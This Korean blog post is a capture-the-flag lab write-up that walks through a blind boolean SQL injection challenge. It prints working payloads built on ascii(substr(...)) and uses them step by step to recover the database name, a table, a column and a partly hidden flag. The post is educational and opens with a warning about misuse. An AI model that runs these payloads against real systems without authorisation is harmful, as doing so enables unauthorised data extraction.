---
layout: single
title:  "8 주차 SQL injection 데이터 추출 문제 풀이(2)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false
---

<br>

# <span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(2)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1  SQLi Point 2 문제 </span>

<br>

<img src="/images/2024-06-09-SQLinjection26/image-20240612204234463.png" alt="image-20240612204234463" style="zoom:67%;" />

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span>

***

<br>

마이페이지와 게시판이 존재합니다. 

<img src="/images/2024-06-09-SQLinjection26/image-20240612204423453.png" alt="image-20240612204423453" style="zoom: 67%;" />

<img src="/images/2024-06-09-SQLinjection26/image-20240612204359138.png" alt="image-20240612204359138" style="zoom:67%;" />



![image-20240612204614693](/images/2024-06-09-SQLinjection26/image-20240612204614693.png)

![image-20240612205028717](/images/2024-06-09-SQLinjection26/image-20240612205028717.png)

![image-20240612205055104](/images/2024-06-09-SQLinjection26/image-20240612205055104.png)

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span>

***

<br>

<img src="/images/2024-06-09-SQLinjection26/image-20240612205154382.png" alt="image-20240612205154382" style="zoom:67%;" />

![image-20240612205214639](/images/2024-06-09-SQLinjection26/image-20240612205214639.png)





<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span>

***

<br>

(ascii(substr((select ~~),1,1))>0) and username

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span>

***

<br>

(ascii(substr((select database() limit 0,1),1,1))>0) and username

![image-20240612205441694](/images/2024-06-09-SQLinjection26/image-20240612205441694.png)

sqli_7

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span>

***

<br>

select table_name from information_schema.tables where table_schema='sqli_7' limit 0,1

(ascii(substr((select table_name from information_schema.tables where table_schema='sqli_7' limit 0,1),1,1))>0) and username

![image-20240612205643107](/images/2024-06-09-SQLinjection26/image-20240612205643107.png)

flagTable

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span>

***

<br>

select column_name from information_schema.columns where table_name='flagTable' limit 0,1

(ascii(substr((select column_name from information_schema.columns where table_name='flagTable' limit 0,1),1,1))>0) and username

![image-20240612205852379](/images/2024-06-09-SQLinjection26/image-20240612205852379.png)

flag

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span>

***

<br>

select flag from flagTable limit 0,1 

(ascii(substr((select flag from flagTable limit 0,1),1,1)>0) and username

f~~

w~~

![image-20240612223150754](/images/2024-06-09-SQLinjection26/image-20240612223150754.png)

segfault{~~}

